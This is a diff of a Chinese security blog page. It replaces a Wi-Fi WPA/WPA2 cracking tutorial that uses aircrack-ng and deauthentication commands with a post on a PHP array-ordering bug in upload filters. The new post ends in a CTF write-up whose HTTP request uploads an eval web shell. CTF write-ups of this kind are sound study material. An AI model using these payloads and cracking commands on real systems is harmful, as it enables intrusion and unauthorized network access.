@@ -119,7 +119,7 @@
 
 
 
-  <title>利用kali破解wpa/wpa2加密的WIFI（爆破美学） | 从零开始的学习生涯</title>
+  <title>PHP数组与c数组差异而引发的安全问题 | 从零开始的学习生涯</title>
   
 
 
@@ -262,7 +262,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/01/利用kali破解wpa-wpa2加密的WIFI（爆破美学）/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/24/PHP数组与c数组差异而引发的问题/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="平贺桐人">
@@ -279,7 +279,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">利用kali破解wpa/wpa2加密的WIFI（爆破美学）</h1>
+          <h1 class="post-title" itemprop="name headline">PHP数组与c数组差异而引发的安全问题</h1>
         
 
         <div class="post-meta">
@@ -291,7 +291,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-01T22:26:38+08:00">2018-05-01</time>
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-24T22:19:24+08:00">2018-08-24</time>
             
 
             
@@ -299,24 +299,6 @@
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/kali/" itemprop="url" rel="index"><span itemprop="name">kali</span></a></span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -345,31 +327,83 @@
       
 
       
-        <h1 id="利用kali破解wpa-wpa2加密的WIFI（爆破美学）"><a href="#利用kali破解wpa-wpa2加密的WIFI（爆破美学）" class="headerlink" title="利用kali破解wpa/wpa2加密的WIFI（爆破美学）"></a>利用kali破解wpa/wpa2加密的WIFI（爆破美学）</h1><h2 id="硬件准备阶段："><a href="#硬件准备阶段：" class="headerlink" title="硬件准备阶段："></a>硬件准备阶段：</h2><p>因为用vm安装的kali不支持笔记本内置的无限网卡所以需要购买kali支持的网卡，博主买的是<strong>RT3070L芯片组</strong>的网卡，某宝上面无壳的只要20元，加壳才25元。<br>在kali中必须识别出网卡，使用<strong>ifconfig</strong>查看网卡信息，wlan0为无线网卡。<img src="https://s1.ax1x.com/2018/05/01/CJh0tx.jpg" alt="CJh0tx.jpg"></p>
-<h2 id="攻击准备阶段："><a href="#攻击准备阶段：" class="headerlink" title="攻击准备阶段："></a>攻击准备阶段：</h2><h3 id="开启网卡监听模式："><a href="#开启网卡监听模式：" class="headerlink" title="开启网卡监听模式："></a>开启网卡监听模式：</h3><pre><code>airmon-ng start wlan0
-</code></pre><p>如果成功的话，网卡名称会变成wlan0mon<br><img src="https://s1.ax1x.com/2018/05/01/CJhwA1.jpg" alt="CJhwA1.jpg"></p>
-<h3 id="扫描热点："><a href="#扫描热点：" class="headerlink" title="扫描热点："></a>扫描热点：</h3><pre><code>airodump-ng wlan0mon
-</code></pre><p>可以看到如图信息[<img src="https://s1.ax1x.com/2018/05/01/CJha7R.md.jpg" alt="CJha7R.md.jpg"></p>
-<h3 id="抓握手包："><a href="#抓握手包：" class="headerlink" title="抓握手包："></a>抓握手包：</h3><p>c代表信道，bssid为mac地址，w参数指的是抓到的包放的目录以及包的名字。</p>
-<pre><code>airodump-ng wlan0mon -c 4 --bssid XX:XX:XX:XX -w /root
+        <h1 id="C语言数组"><a href="#C语言数组" class="headerlink" title="C语言数组"></a>C语言数组</h1><p><strong>C语言的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。</strong><br><img src="https://fdrag0n.github.io/image/2018-8-24 235941/arrays.jpg" alt="Alt text"><br>设有一个数组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int array[2];</span><br></pre></td></tr></table></figure>
+<p>无论是先给<code>array[0]</code>赋值,还是先给<code>array[1]</code>赋值，其在内存中的排序都是<code>array[0]</code>在前面<code>array[1]</code>在后面，所以无论是用指针指向array的最后一个单元还是直接引用<code>array[1]</code>的值,其所指的都是同一个值。</p>
+<h1 id="PHP的数组"><a href="#PHP的数组" class="headerlink" title="PHP的数组"></a>PHP的数组</h1><p><strong>而PHP数组与C语言数组不一样，PHP 中的数组实际上是一个有序映射。映射是一种把 values 关联到 keys 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组，或列表（向量），散列表（是映射的一种实现），字典，集合，栈，队列以及更多可能性。由于数组元素的值也可以是另一个数组，树形结构和多维数组也是允许的。</strong><br>贴上一个简易的上传过滤源码</p>
+<pre><code>&lt;?php
+    $file = $_GET[&apos;file&apos;];
+    if (!is_array($file)) {
+        $file = explode(&apos;.&apos;, strtolower($file));
+    }
+    print_r ($file);
+    echo &apos;&lt;/br&gt;&apos;;
+    $ext = end($file);
+    if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) {
+        print(&apos;This file is not allowed!&lt;/br&gt;&apos;);
+    }
+    else print(&apos;success!&lt;/br&gt;&apos;);
+    var_dump($file);
+    echo &apos;&lt;/br&gt;&apos;;
+    $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];
+    echo &apos;filename:&apos;.$filename;
+    echo &apos;&lt;/br&gt;&apos;;
+    echo &apos;end($file):&apos;.end($file);
+?&gt;
+</code></pre><p>如图<code>file[0]</code>和<code>file[1]</code>都是由get传参，如果先给<code>file[0]</code>赋值png，再给<code>file[1]</code>赋值php的话，会被拦截。</p>
+<pre><code>file[0]=png&amp;file[1]=php
+</code></pre><p>但是如果先给<code>file[1]</code>赋值php，再给<code>file[0]</code>赋值png的话，则可以成功绕过过滤规则上传。</p>
+<pre><code>file[1]=php&amp;file[0]=png
+</code></pre><p>演示截图：</p>
+<p><img src="https://fdrag0n.github.io/image/2018-8-24 235941/2018-8-24 231639.PNG" alt="Alt text"></p>
+<p>代码第六行和第十二行将其显示出来，由图右侧可见，如果先给<code>file[0]</code>赋值png，再给<code>file[1]</code>赋值php的话，数组是<code>Array ( [0] =&gt; png [1] =&gt; php )</code>，会被拦截。</p>
+<p>而如果先给<code>file[1]</code>赋值php，再给<code>file[0]</code>赋值png的话，数组就是<code>Array ( [1] =&gt; php [0] =&gt; png )</code> ,它所占内存区域中最后一个单元是<code>file[0]=&gt;png</code>，而<strong>不像</strong>C语言一样是file[1]，所以如果过滤代码一方面用<code>end()</code>来取出数组最后一个单元，而另外一处却用<code>$file[count($file) - 1]</code>来取出最后一个单元，就会存在有绕过的漏洞。</p>
+<h1 id="拿python来比较一下更好说明"><a href="#拿python来比较一下更好说明" class="headerlink" title="拿python来比较一下更好说明"></a>拿python来比较一下更好说明</h1><ul>
+<li>C语言的数组更像Python 列表(List)</li>
+<li>而PHP的数组像Python 字典(Dictionary)</li>
+</ul>
+<h1 id="涉及到的CTF：-网鼎杯第二场的上传题–wafUpload"><a href="#涉及到的CTF：-网鼎杯第二场的上传题–wafUpload" class="headerlink" title="涉及到的CTF： 网鼎杯第二场的上传题–wafUpload"></a>涉及到的CTF： 网鼎杯第二场的上传题–wafUpload</h1><pre><code>&lt;?php
+$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);
+@mkdir($sandbox);
+@chdir($sandbox);
 
--c 选择信道，对应上图CH
---bssid 需要破解的wifi的mac地址
--w cap文件名及路径
-wlan0mon 启用监听模式的网卡名
-</code></pre><p>当有人连接时就能抓到握手包。<img src="https://s1.ax1x.com/2018/05/01/CJhUB9.jpg" alt="CJhUB9.jpg"></p>
-<h4 id="如果对面都在使用wifi，没人连接怎么办？"><a href="#如果对面都在使用wifi，没人连接怎么办？" class="headerlink" title="如果对面都在使用wifi，没人连接怎么办？"></a>如果对面都在使用wifi，没人连接怎么办？</h4><p>通过以下命令断开设备与WiFi的连接</p>
-<pre><code>aireplay-ng -0 20 -a A8:6B:7C:19:9F:D0 -c 4C:49:E3:D8:FD:7F wlan0mon
+if (!empty($_FILES[&apos;file&apos;])) {
+#mime check
+if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) {
+die(&apos;This type is not allowed!&apos;);
+}
 
--0 death（强制下线模式），20为执行次数
--c 被断网的客户机MAC
--a WIFI热点的mac
-</code></pre><p>抓包成功后白圈出现信息。<br><img src="https://s1.ax1x.com/2018/05/01/CJhUB9.jpg" alt="CJhUB9.jpg"></p>
-<h3 id="爆破："><a href="#爆破：" class="headerlink" title="爆破："></a>爆破：</h3><h4 id="kali："><a href="#kali：" class="headerlink" title="kali："></a>kali：</h4><p>利用aircrack-ng命令</p>
-<pre><code>aircrack-ng -w 字典 握手包
-</code></pre><p>cpu跑这个破解速度有些慢。</p>
-<h4 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h4><h5 id="神器1："><a href="#神器1：" class="headerlink" title="神器1："></a>神器1：</h5><p>EWSA，然而7.x版本虽然支持gpu加速，然而没有破解版软件，只能查看密码前两位，收费299$(贵死人)</p>
-<h5 id="神器2："><a href="#神器2：" class="headerlink" title="神器2："></a>神器2：</h5><p>oclHashcat，使用方法有些复杂，是一个win下面的使用命令行的工具，破解速度十分可观。<br>有国人开发了中文版的UI，减少了使用成本，链接：<a href="https://www.iteknical.com/hashcat-gui-cn/" target="_blank" rel="noopener">HashcatGUI_cn – HashcatGUI 中文版</a></p>
+#check filename
+$file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;];
+if (!is_array($file)) {
+$file = explode(&apos;.&apos;, strtolower($file));
+}
+$ext = end($file);
+if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) {
+die(&apos;This file is not allowed!&apos;);
+}
+
+$filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];
+if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) {
+echo &apos;Success!&apos;;
+echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename;
+} else {
+echo &apos;Failed!&apos;;
+}
+}
+show_source(__file__);
+?&gt;
+</code></pre><ul>
+<li>第8-10行mime check部分 MIME 类型检测，使用图片马绕过。</li>
+<li><p>第12-20行check filename部分 对文件后缀进行了检测，而后缀名则是取 <code>$file</code> 数组中最后一个元素。然后在生成文件的时候，文件名取<code>$file</code> 数组的最后一个元素做后缀，这明显存在绕过。我们只要控制<code>$file</code>数组中参数的即可绕过并 getshell ，请求数据包如下</p>
+<p>  POST / HTTP/1.1<br>  Host: 4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com<br>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0<br>  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>  Accept-Encoding: gzip, deflate<br>  Referer: <a href="http://4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com/" target="_blank" rel="noopener">http://4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com/</a><br>  Content-Type: multipart/form-data; boundary=—————————9930139772306<br>  Content-Length: 524<br>  DNT: 1<br>  Connection: close<br>  Upgrade-Insecure-Requests: 1</p>
+<p>  —————————–9930139772123<br>  Content-Disposition: form-data; name=”filename[1]”</p>
+<p>  php<br>  —————————–9930139772123<br>  Content-Disposition: form-data; name=”filename[0]”</p>
+<p>  png<br>  —————————–9930139772123<br>  Content-Disposition: form-data; name=”file”; filename=”fdrag0n.jpg”<br>  Content-Type: image/jpeg</p>
+<p>  &lt;?php @eval($_POST[‘a’]);?&gt;<br>  —————————–9930139772123<br>  Content-Disposition: form-data; name=”submit”</p>
+<p>  Submit<br>  —————————–9930139772123–</p>
+</li>
+</ul>
 
       
     </div>
@@ -385,12 +419,6 @@ wlan0mon 启用监听模式的网卡名
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/kali/" rel="tag"># kali</a>
-          
-        </div>
-      
 
       
       
@@ -400,8 +428,8 @@ wlan0mon 启用监听模式的网卡名
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/09/文件上传漏洞常用命令/" rel="next" title="文件上传漏洞常用命令">
-                <i class="fa fa-chevron-left"></i> 文件上传漏洞常用命令
+              <a href="/2018/08/13/利用autorun-inf预防自动运行病毒及个性化磁盘图标/" rel="next" title="利用autorun.inf预防自动运行病毒及个性化磁盘图标">
+                <i class="fa fa-chevron-left"></i> 利用autorun.inf预防自动运行病毒及个性化磁盘图标
               </a>
             
           </div>
@@ -409,10 +437,6 @@ wlan0mon 启用监听模式的网卡名
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/05/05/sql手注步骤/" rel="prev" title="sql手注步骤（非盲注）">
-                sql手注步骤（非盲注） <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -541,7 +565,7 @@ wlan0mon 启用监听模式的网卡名
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#利用kali破解wpa-wpa2加密的WIFI（爆破美学）"><span class="nav-number">1.</span> <span class="nav-text">利用kali破解wpa/wpa2加密的WIFI（爆破美学）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#硬件准备阶段："><span class="nav-number">1.1.</span> <span class="nav-text">硬件准备阶段：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击准备阶段："><span class="nav-number">1.2.</span> <span class="nav-text">攻击准备阶段：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#开启网卡监听模式："><span class="nav-number">1.2.1.</span> <span class="nav-text">开启网卡监听模式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描热点："><span class="nav-number">1.2.2.</span> <span class="nav-text">扫描热点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#抓握手包："><span class="nav-number">1.2.3.</span> <span class="nav-text">抓握手包：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#如果对面都在使用wifi，没人连接怎么办？"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">如果对面都在使用wifi，没人连接怎么办？</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破："><span class="nav-number">1.2.4.</span> <span class="nav-text">爆破：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#kali："><span class="nav-number">1.2.4.1.</span> <span class="nav-text">kali：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#windows："><span class="nav-number">1.2.4.2.</span> <span class="nav-text">windows：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#神器1："><span class="nav-number">1.2.4.2.1.</span> <span class="nav-text">神器1：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#神器2："><span class="nav-number">1.2.4.2.2.</span> <span class="nav-text">神器2：</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#C语言数组"><span class="nav-number">1.</span> <span class="nav-text">C语言数组</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP的数组"><span class="nav-number">2.</span> <span class="nav-text">PHP的数组</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#拿python来比较一下更好说明"><span class="nav-number">3.</span> <span class="nav-text">拿python来比较一下更好说明</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#涉及到的CTF：-网鼎杯第二场的上传题–wafUpload"><span class="nav-number">4.</span> <span class="nav-text">涉及到的CTF： 网鼎杯第二场的上传题–wafUpload</span></a></li></ol></div>
             
 
           </div>
